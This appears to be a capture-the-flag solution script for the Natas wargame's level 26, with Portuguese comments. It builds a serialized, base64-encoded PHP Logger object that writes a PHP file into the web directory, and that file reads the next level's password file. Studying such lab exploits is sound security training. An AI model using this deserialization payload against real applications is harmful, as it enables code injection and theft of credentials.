<?php

// Define a classe Logger
class Logger 
{
    private $logFile;     // Variável privada para armazenar o caminho do arquivo de log
    private $initMsg;     // Variável privada para armazenar a mensagem inicial
    private $exitMsg;     // Variável privada para armazenar a mensagem de saída
    
    // O construtor da classe Logger
    function __construct()
    {
        // Inicializa a variável initMsg com uma mensagem de saudação
        $this->initMsg="heyyyyyy\n";
        
        // Inicializa a variável exitMsg com código PHP que tenta ler um arquivo
        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";

        // Define o caminho do arquivo de log como "/var/www/natas/natas26/img/cyber.txt"
        $this->logFile = "/var/www/natas/natas26/img/n0j.txt";
    }
}

	// Cria um objeto da classe Logger
	$o = new Logger();

	// Serializa o objeto e o codifica em base64 para criar uma string
	print base64_encode(serialize($o))."\n";
?>

